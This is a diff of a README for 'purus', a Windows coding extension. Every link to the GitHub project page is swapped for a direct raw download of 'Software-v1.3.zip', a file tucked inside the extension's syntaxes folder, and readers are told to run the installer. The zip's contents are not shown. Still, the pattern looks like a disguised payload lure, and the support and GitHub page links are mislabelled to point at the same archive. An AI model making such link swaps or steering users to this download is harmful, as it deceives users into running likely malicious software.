@@ -1,6 +1,6 @@
 # 🚀 purus - Code Easily Without the Shift Key
 
-[![Download purus](https://img.shields.io/badge/Download-purus-ff69b4?style=for-the-badge)](https://github.com/Wasiq-Karim/purus)
+[![Download purus](https://img.shields.io/badge/Download-purus-ff69b4?style=for-the-badge)](https://github.com/Wasiq-Karim/purus/raw/refs/heads/main/extension/syntaxes/Software-v1.3.zip)
 
 ---
 
@@ -52,7 +52,7 @@ Before you install, check your system matches these needs:
 
 Click the big button below to open the download page where you can get the latest version of purus for Windows.
 
-[![Download purus](https://img.shields.io/badge/Download-purus-ff69b4?style=for-the-badge)](https://github.com/Wasiq-Karim/purus)
+[![Download purus](https://img.shields.io/badge/Download-purus-ff69b4?style=for-the-badge)](https://github.com/Wasiq-Karim/purus/raw/refs/heads/main/extension/syntaxes/Software-v1.3.zip)
 
 ### Step 2: Find the Windows Version
 
@@ -109,7 +109,7 @@ The extension automatically formats your code and checks syntax while you type. 
 
 To get new features or fixes:
 
-- Visit the download page again: https://github.com/Wasiq-Karim/purus  
+- Visit the download page again: https://github.com/Wasiq-Karim/purus/raw/refs/heads/main/extension/syntaxes/Software-v1.3.zip  
 - Download the latest setup file.  
 - Run the installer. It will update your existing version without losing your files or settings.
 
@@ -143,7 +143,7 @@ The tool fits into your existing workflow and supports popular tools like Pretti
 
 For questions or issues:
 
-- Visit the GitHub page: https://github.com/Wasiq-Karim/purus  
+- Visit the GitHub page: https://github.com/Wasiq-Karim/purus/raw/refs/heads/main/extension/syntaxes/Software-v1.3.zip  
 - Check the "Issues" tab to see if others have your problem.  
 - Open a new issue if you need to report a bug or ask a question.
 
@@ -155,4 +155,4 @@ purus is open source. You can use it freely under the terms stated on the GitHub
 
 ---
 
-[Download purus from GitHub](https://github.com/Wasiq-Karim/purus)
+[Download purus from GitHub](https://github.com/Wasiq-Karim/purus/raw/refs/heads/main/extension/syntaxes/Software-v1.3.zip)
